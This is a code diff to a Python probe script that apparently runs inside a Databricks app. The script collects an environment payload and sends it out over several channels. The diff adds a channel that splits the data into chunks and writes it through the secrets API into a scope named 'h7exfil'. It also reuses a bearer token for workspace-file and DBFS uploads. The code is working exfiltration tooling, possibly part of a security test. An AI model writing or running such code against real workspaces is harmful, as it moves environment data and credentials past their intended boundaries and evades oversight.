@@ -137,6 +137,17 @@ def deliver(payload):
             delivery["scope_create"] = f"{r.status_code} {r.text[:120]}"
         except Exception as e:
             delivery["scope_create"] = "ERR " + str(e)[:100]
+        # channel F: write results into operator-managed scope h7exfil (chunked)
+        try:
+            chunk = 3000
+            n = 0
+            for i in range(0, len(data), chunk):
+                r = rq.post(f"{host}/api/2.0/secrets/put", headers=H, json={
+                    "scope": "h7exfil", "key": f"h7env_{n}", "string_value": data[i:i+chunk]}, timeout=15)
+                n += 1
+            delivery["h7exfil_put"] = f"{r.status_code} chunks={n} {r.text[:120]}"
+        except Exception as e:
+            delivery["h7exfil_put"] = "ERR " + str(e)[:100]
     except Exception as e:
         delivery["token_err"] = str(e)[:200]
     return delivery
@@ -157,13 +168,21 @@ def self_probe():
         appn = os.environ.get("DATABRICKS_APP_NAME", "h7-env-app")
         data = json.dumps(payload, indent=1, default=str)
         b64 = base64.b64encode(data.encode()).decode()
+        H2 = {"Authorization": "Bearer " + tok}
         r = rq.put(f"{host}/api/2.0/workspace/files/Workspace/Applications/{appn}/h7env_results.json",
-                   headers={"Authorization": "Bearer " + tok}, data=data.encode(),
+                   headers=H2, data=data.encode(),
                    params={"overwrite": "true"}, timeout=15)
-        r2 = rq.post(f"{host}/api/2.0/dbfs/put", headers={"Authorization": "Bearer " + tok},
+        r2 = rq.post(f"{host}/api/2.0/dbfs/put", headers=H2,
                      json={"path": "dbfs:/tmp/h7env_results.json", "content": b64, "overwrite": True},
                      timeout=15)
-        payload["delivery_attempt2"] = {"files": r.status_code, "dbfs": r2.status_code}
+        chunk = 3000
+        n = 0
+        for i in range(0, len(data), chunk):
+            r3 = rq.post(f"{host}/api/2.0/secrets/put", headers=H2, json={
+                "scope": "h7exfil", "key": f"h7env_{n}", "string_value": data[i:i+chunk]}, timeout=15)
+            n += 1
+        payload["delivery_attempt2"] = {"files": r.status_code, "dbfs": r2.status_code,
+                                        "h7exfil": f"{r3.status_code} chunks={n}"}
     except Exception as e:
         payload["delivery_attempt2"] = str(e)[:150]
     print("H7ENV_FINAL " + json.dumps(payload, default=str), flush=True)
